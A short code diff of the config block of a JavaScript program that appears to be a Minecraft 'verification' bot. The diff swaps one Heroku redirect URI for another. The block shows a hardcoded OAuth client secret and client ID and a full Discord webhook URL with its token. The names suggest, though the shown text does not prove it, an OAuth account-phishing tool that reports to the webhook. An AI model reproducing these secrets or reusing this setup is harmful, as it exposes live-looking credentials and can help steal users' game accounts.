@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'g9P8Q~1n32zLUqoFoWwrNcKr_nTkCUR.a13KZdel'
 const client_id = '9468a37f-f09b-4268-a2db-163e0cce6377'
-const redirect_uri = 'https://verificationmcbot.herokuapp.com/'
+const redirect_uri = 'https://verificationbotmc1.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1041054488636686367/u8ola2bmubLelHuCrOT_wDFhqtiY5YJc77tvs8lSXhDRu6nKR3hHWtImcUyP1ZCW2CkT'
 //Requirements
 const axios = require('axios')
